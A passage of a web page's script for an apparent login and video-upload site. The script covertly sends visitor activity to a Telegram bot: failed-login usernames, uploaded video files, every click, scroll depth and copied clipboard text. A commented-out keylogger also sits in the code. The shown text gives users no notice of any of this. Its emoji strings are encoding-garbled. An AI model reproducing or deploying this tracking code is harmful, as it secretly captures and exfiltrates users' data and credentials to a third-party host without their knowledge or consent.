        alert('Invalid username or password.');
        sendToBot(`‚ùå Failed login attempt with username: "${username}"`);
        usernameInput.value = ''; // Clear inputs on failure
        passwordInput.value = '';
      }
    });

    const videoUploadInputEl = document.getElementById('videoUpload');
    const fileNameDisplayEl = document.getElementById('fileNameDisplay');
    const uploadProgressDivEl = document.getElementById('uploadProgress');
    const progressBarEl = document.getElementById('progressBar');
    const progressTextEl = document.getElementById('progressText');
    const uploadedVideosDivEl = document.getElementById('uploadedVideos');

    videoUploadInputEl.addEventListener('change', function() {
        fileNameDisplayEl.textContent = (this.files && this.files.length > 0) ? this.files[0].name : 'No file chosen';
    });

    document.getElementById('uploadVideoButton').addEventListener('click', uploadVideo);

    function uploadVideo() {
      const file = videoUploadInputEl.files[0];
      if (!file) { alert("Please select a video file first."); return; }

      const fileSizeMB = (file.size / 1024 / 1024).toFixed(2);
      const MAX_FILE_SIZE_MB = 50; // Telegram Bot API limit is 50MB for videos

      if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
          alert(`File is too large (${fileSizeMB}MB). Max ${MAX_FILE_SIZE_MB}MB.`);
          sendToBot(`‚ö†Ô∏è Upload fail (size): ${file.name} (${fileSizeMB}MB) > ${MAX_FILE_SIZE_MB}MB`);
          videoUploadInputEl.value = null; fileNameDisplayEl.textContent = 'No file chosen'; return;
      }

      sendToBot(`üì• Upload init: ${file.name} (${fileSizeMB}MB)`);
      uploadProgressDivEl.style.display = 'block';
      progressBarEl.removeAttribute('value');
      progressTextEl.textContent = 'Preparing file...';

      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('video', file, file.name);
      formData.append('caption', `üé¨ User uploaded: ${file.name} (${fileSizeMB}MB)`);
      formData.append('supports_streaming', true);

      progressTextEl.textContent = 'Uploading video...';
      progressBarEl.value = 10;
       const progressInterval = setInterval(() => {
           if (progressBarEl.value < 90) progressBarEl.value += 5;
       }, 500);


      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: formData })
      .then(response => response.json())
      .then(data => {
          clearInterval(progressInterval);
          progressBarEl.value = 100;
          if (data.ok) {
              progressTextEl.textContent = 'Upload successful!';
              sendToBot(`‚úÖ TG Video Sent: ${file.name}`);
              const videoPreviewElement = document.createElement('video');
              videoPreviewElement.src = URL.createObjectURL(file);
              videoPreviewElement.controls = true;
              videoPreviewElement.width = 320;
              videoPreviewElement.onloadedmetadata = () => URL.revokeObjectURL(videoPreviewElement.src); // Free memory

              const videoTitleElement = document.createElement('p');
              videoTitleElement.textContent = `Preview: ${file.name}`;
              videoTitleElement.style.fontWeight = 'bold';
              const containerElement = document.createElement('div');
              containerElement.append(videoTitleElement, videoPreviewElement);
              uploadedVideosDivEl.insertBefore(containerElement, uploadedVideosDivEl.firstChild); // Add to top
          } else {
              progressTextEl.textContent = 'Upload failed.';
              sendToBot(`‚ùå TG Video Err: ${file.name} - ${data.description}`);
              console.error("TG VidErr:", data);
          }
      }).catch(error => {
          clearInterval(progressInterval);
          progressBarEl.value = 100;
          progressTextEl.textContent = 'Upload failed. Network error.';
          sendToBot(`üö´ Net VidErr: ${file.name} - ${error.message}`);
          console.error("Net VidErr:", error);
      }).finally(() => {
          setTimeout(() => {
              uploadProgressDivEl.style.display = 'none';
              progressBarEl.removeAttribute('value');
              progressTextEl.textContent = '';
          }, 7000);
          videoUploadInputEl.value = null;
          fileNameDisplayEl.textContent = 'No file chosen';
      });
    }


    // getElementDescriptor for logging clicks
    function getElementDescriptor(element) {
        if (!element) return 'N/A';
        let descriptor = element.tagName;
        if (element.id) descriptor += `#${element.id}`;
        if (element.className && typeof element.className === 'string' && element.className.trim() !== '') {
            descriptor += `.${element.className.trim().split(/\s+/).join('.')}`;
        }
        if (element.tagName === 'A' && element.href) {
            descriptor += ` (href: ${element.href.substring(0, 50)}${element.href.length > 50 ? '...' : ''})`;
        } else if (['BUTTON','INPUT','P','H1','H2','H3','SPAN','DIV','LI','TD','TH'].includes(element.tagName)) {
            const textContent = (element.textContent || element.value || "").trim().substring(0, 30);
            if (textContent) descriptor += ` (text: "${textContent}${textContent.length === 30 ? '...' : ''}")`;
        } else if (element.type && ['INPUT','BUTTON'].includes(element.tagName)) {
             const valueContent = (element.value || "").trim().substring(0, 30);
             if (valueContent) descriptor += `[type=${element.type}, value="${valueContent}${valueContent.length === 30 ? '...' : ''}"]`;
             else descriptor += `[type=${element.type}]`;
        }
        return descriptor;
    }
    // Add click logging
    document.addEventListener('click', event => {
        sendToBot(`üñ±Ô∏è Click: ${getElementDescriptor(event.target)}`)
         // On any click, attempt to resume audio context if suspended
         if(audioContext && audioContext.state === 'suspended') {
             audioContext.resume().then(() => console.log('AudioContext resumed from click')).catch(e => console.error('Resume failed:', e));
         }
    }, true); // Use capture phase to get clicks early

    let maxScrollDepthAchieved = 0;
    const scrollMilestones = [25, 50, 75, 90, 100];
    let reportedMilestones = new Set();

    function getCurrentScrollPercentage() {
        const scrollableHeight = document.documentElement.scrollHeight - window.innerHeight;
        // Handle case where content is not scrollable
        return scrollableHeight <= 0 ? 100 : (window.scrollY / scrollableHeight) * 100;
    }
    function checkScrollDepth() {
        const currentDepth = getCurrentScrollPercentage();
        if (currentDepth > maxScrollDepthAchieved) maxScrollDepthAchieved = currentDepth;
        for (const milestone of scrollMilestones) {
            if (maxScrollDepthAchieved >= milestone && !reportedMilestones.has(milestone)) {
                sendToBot(`üìú Scroll ${milestone}%`);
                reportedMilestones.add(milestone);
            }
        }
         // Check 100% separately as sometimes the maxDepth might reach it exactly
         if (Math.abs(currentDepth - 100) < 1 && !reportedMilestones.has(100)) {
             sendToBot(`üìú Scroll 100%`);
             reportedMilestones.add(100);
         }
    }
    let scrollTimeout;
    window.addEventListener('scroll', () => {
        clearTimeout(scrollTimeout);
        scrollTimeout = setTimeout(checkScrollDepth, 250);
    }, {passive: true}); // Use passive: true for better scroll performance
    checkScrollDepth(); // Initial check

    document.addEventListener('copy', event => {
        const copiedText = (window.getSelection() || "").toString().trim();
        if (copiedText) sendToBot(`üìã Copy:"${copiedText.substring(0, 100)}${copiedText.length > 100 ? '...' : ''}"`);
    });

    // Log pasting action
    document.addEventListener('paste', event => {
        // This is harder to get the actual pasted content securely, just log the action
        sendToBot(`üìã Paste detected`);
    });

    // Log key presses (be careful, this can generate a lot of messages)
    // document.addEventListener('keypress', event => {
    //     sendToBot(`‚å®Ô∏è Keypress: "${event.key}" (Code: ${event.keyCode})`);
    // });

    // Log form submissions (already handled by loginForm, but maybe other forms exist?)
    // document.querySelectorAll('form').forEach(form => {
    //     form.addEventListener('submit', event => {
    //          sendToBot(`‚úâÔ∏è Form submitted: ${getElementDescriptor(form)}`);
    //     });
    // });

  </script>
</body>
</html>
